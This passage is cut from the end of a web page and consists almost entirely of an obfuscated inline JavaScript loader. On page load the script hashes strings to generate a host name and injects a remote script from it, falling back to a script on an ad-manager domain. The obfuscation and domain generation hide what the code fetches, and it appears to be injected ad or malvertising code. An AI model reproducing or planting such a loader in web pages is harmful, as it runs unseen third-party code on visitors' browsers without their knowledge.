-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>